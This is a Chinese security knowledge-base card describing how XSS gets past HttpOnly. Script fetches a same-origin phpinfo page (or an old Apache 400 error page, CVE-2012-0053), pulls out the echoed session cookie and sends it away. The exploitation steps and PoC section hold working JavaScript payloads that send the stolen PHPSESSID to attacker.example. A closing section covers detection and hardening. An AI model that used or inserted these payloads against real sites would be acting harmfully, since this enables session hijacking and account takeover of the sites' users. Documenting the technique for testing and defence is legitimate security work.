---
id: web-generic-xss-httponly-cookie-leak-phpinfo-apache-400
title: HttpOnly Cookie 绕过读取：同源 phpinfo 回显 Cookie 头，XSS 内 fetch 解析窃取会话（附 Apache CVE-2012-0053 超长 Cookie 400 页变体）
type: scenario
domain: web
path: web/generic/xss
technique: httponly-cookie-reflection-phpinfo-apache-errorpage
aliases:
- HttpOnly 绕过
- HttpOnly Bypass
- phpinfo 读 Cookie
- CVE-2012-0053
- 超长 Cookie 400
- Cookie 窃取
tags:
- web
- xss
- cookie
- httponly
- session-hijack
- phpinfo
- apache
cve:
- CVE-2012-0053
severity: high
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V679
  verified_at: '2026-11-13T12:11:42+08:00'
  notes: 已对照原文核对：phpinfo 回显 COOKIE["PHPSESSID"] 由原文截图(img10)证实；CVE-2012-0053 原文仅文字提及并明确『实在是不好复现』，卡内已标注原文未复现、confidence medium，未给受影响版本故 affected_versions 为空；dedup 无同链卡片。
---

## 一句话结论

HttpOnly 只阻止 JavaScript 通过 `document.cookie` 读取 Cookie，Cookie 仍会随请求自动发送给服务端；当站点同源存在 phpinfo 等会回显请求头的页面时，XSS 可以直接 `fetch` 该页面、从响应 HTML 中解析 `HTTP_COOKIE`/`COOKIE[...]` 行拿到 HttpOnly 会话 Cookie 并外带，从而完成会话劫持；旧版 Apache（2.2.x 早期版本）在超长 Cookie 触发 400 错误时还会在默认错误页回显 Cookie 头（CVE-2012-0053），是同类绕过的历史变体。

## 原理

- **HttpOnly 的作用范围**：它是浏览器 API 层的限制——页面 JS 读不到 `document.cookie` 中的该 Cookie，但浏览器在每次匹配请求中仍会自动携带它（包括 XSS 发起的同源请求）。服务端或中间层只要把请求头原样写进响应，HttpOnly 就形同虚设。
- **phpinfo 回显**：`phpinfo()` 页面会列出 `PHP Variables`，其中 `COOKIE["PHPSESSID"]`（或 `_SERVER["HTTP_COOKIE"]` 等）就是本次请求携带的 Cookie 值；原文截图即显示 `COOKIE["PHPSESSID"] = 1edepg0hc20ffufw665ofnr45`。
- **同源 fetch 可读**：XSS 执行上下文与 phpinfo 页面同源时，`fetch('/phpinfo.php')` 返回的响应体可被 JS 读取，正则提取会话值后外带；跨源时受同源策略/CORS 限制，通常不可读。
- **CVE-2012-0053（历史变体）**：旧版 Apache 2.2.x（修复前）默认错误页在请求头超长（Cookie 头超过约 8KB）返回 400 时会回显请求头，HttpOnly Cookie 因此出现在错误页响应中；XSS 可先向 `document.cookie` 追加大量非 HttpOnly 填充项把 Cookie 头撑大，再让页面请求触发 400，随后同源读取错误页内容解析 Cookie。该路径依赖具体 Apache 版本与错误页配置，原文未复现，仅作为旧环境变体记录。
- **为什么成立**：HttpOnly 防的是"浏览器内 JS 直接读"，不是"服务端回显"；任何反射请求头/调试信息的页面都是读取通道。表单劫持同样可绕过读取限制，但受同源策略约束，通常只能改操作不能读值。

## 触发条件

- 目标存在可执行 JS 的 XSS（反射/存储/DOM 均可），且注入页面与回显请求头的端点同源。
- 同源存在 phpinfo/调试/错误回显页面（常见 `/phpinfo.php`、`/info.php`、`/test.php`、遗留测试目录或框架 debug 页），且未鉴权/未删除。
- 受害者浏览器按攻击者构造的请求访问该端点（XSS 自动发起即可）。
- 会话 Cookie 未被进一步绑定（如 IP/UA/设备指纹）或绑定可绕过，否则窃取后仍需满足绑定条件。
- CVE-2012-0053 变体：目标为修复前 Apache 2.2.x 且错误页配置会回显请求头。

## 利用步骤

1. 先确认 XSS 注入点与执行上下文（能执行任意 JS）。
2. 探测同源回显端点：尝试 `/phpinfo.php`、`/info.php`、`/php_info.php`、`/test.php`、框架 debug 路由；也可从错误页、响应头（`X-Powered-By`）判断 PHP 环境。
3. 构造 XSS payload，在同源内 fetch 该端点并解析 Cookie：
   ```js
   fetch('/phpinfo.php').then(r=>r.text()).then(t=>{
     const m = t.match(/COOKIE\[[^\]]*\]<\/td><td[^>]*>([^<]+)/i) || t.match(/HTTP_COOKIE[^<]*/i);
     new Image().src='//attacker.example/leak?c='+encodeURIComponent(m && m[1] || m);
   });
   ```
4. 在攻击端接收并用窃取的会话 Cookie 重放请求验证会话（视目标是否绑定 IP/UA）。
5. CVE-2012-0053 变体（旧 Apache）：XSS 先设置大量填充 Cookie 把 Cookie 头撑到 8KB 以上，再请求任意页面触发 400，然后同源 fetch 该错误页解析回显的 HttpOnly Cookie。
6. 记录与清理：保留最小 PoC，避免污染受害者会话。

## PoC

```js
// XSS 上下文内执行：读取同源 phpinfo 的 Cookie 值并外带
fetch('/phpinfo.php', {credentials:'include'})
  .then(r => r.text())
  .then(t => {
    const m = t.match(/COOKIE\["PHPSESSID"\]<\/td><td[^>]*>([^<]+)/i);
    location = 'https://attacker.example/?sid=' + encodeURIComponent(m ? m[1] : '');
  });
```

phpinfo 中对应行形如：

```text
COOKIE["PHPSESSID"]    1edepg0hc20ffufw665ofnr45
```

说明：phpinfo 回显 Cookie 已由原文截图证实；CVE-2012-0053 部分依赖旧版 Apache 且原文未复现，标 confidence: medium。未在目标环境执行。

## 变体与关联

- 变体：框架 debug 页、`phpinfo()` 输出、`var_dump($_COOKIE)` 调试接口、错误页回显请求头，均可作为同源读取通道。
- 变体：登录表单劫持——XSS 改写登录表单 action 或监听提交，能把用户输入交给攻击者，但读不到已有 Cookie，且受同源策略限制。
- 关联：[[web-generic-xss-scriptless-execution-vectors]]（XSS 载体）、[[web-generic-xss-filter-bypass-encoding-obfuscation]]（XSS 过滤绕过）、[[web-generic-xss-custom-tag-tabindex-anchor-onfocus-bypass]]（无标准标签时的 XSS 注入）。
- 边界：phpinfo 已删除/鉴权、CSP 阻止外连、Cookie 绑定设备指纹、会话短生命周期 + 二次验证，都会降低该链成功率。

## 检测与防御

- 删除或鉴权 phpinfo/调试页面，生产环境关闭详细错误回显；对所有反射请求头的接口做统一收口。
- 升级 Apache（CVE-2012-0053 修复版本），自定义错误页不输出请求头，限制请求头大小。
- 会话加固：`__Host-`/`__Secure-` 前缀、`SameSite=Lax/Strict`、短有效期、服务端绑定 IP/UA/设备指纹、敏感操作二次认证。
- 检测：phpinfo/调试路径的异常访问、同源 XSS 注入后紧跟对 `/phpinfo.php` 等端点的请求、异常超长 Cookie 头与 400 错误页响应体中含 Cookie 字符串、外连图片/请求携带会话值。
- 说明：HttpOnly 只是纵深防御的一层，不能替代 XSS 修复与调试端点治理。
